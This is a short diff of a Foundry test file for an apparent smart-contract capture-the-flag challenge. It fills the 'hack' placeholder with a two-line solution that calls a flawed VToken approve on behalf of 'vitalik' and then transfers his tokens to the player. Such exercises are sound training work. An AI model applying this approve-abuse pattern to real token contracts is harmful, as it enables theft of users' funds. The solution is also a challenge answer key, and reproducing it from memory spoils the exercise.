@@ -24,11 +24,8 @@ contract Challenge0Test is Test {
     function testChallenge() public {        
         vm.startPrank(player);
 
-        /*//////////////////////////////
-        //    Add your hack below!    //
-        //////////////////////////////*/
-
-        //============================//
+        VToken(token).approve(vitalik, player, 100 ether);
+        VToken(token).transferFrom(vitalik, player, 10 ether);
 
         vm.stopPrank();
 
